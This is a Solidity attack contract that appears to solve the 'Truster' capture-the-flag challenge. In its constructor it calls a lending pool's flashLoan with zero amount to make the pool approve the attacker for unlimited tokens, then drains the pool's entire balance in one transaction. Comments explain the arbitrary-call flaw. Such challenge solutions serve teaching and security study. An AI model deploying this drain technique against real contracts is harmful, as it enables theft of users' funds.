// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackTruster {
    TrusterLenderPool public truster;
    address public token;
    // the flashLoan function offers us, an untrusted entity, a low level function call to any target
    // thus we simply need to call the approve function and give our attacker total
    // transferFrom access to all tokens in the pool 
    // then we drain the pool
    // By using this attack contract and executing the exploit in the constructor we
    // satified the optional challenge requirement of using only one TX
    // also the flashloan functino never checks for 0 imput loans so we can use this to avoid
    // reverting the flashloan since balance == balance always
    constructor(address _truster, address _token) {
        truster = TrusterLenderPool(_truster);
        token = _token;
        truster.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)
        );
        uint256 balance = IERC20(address(token)).balanceOf(address(truster));
        IERC20(address(token)).transferFrom(
            address(truster),
            msg.sender,
            balance
        );
    }
}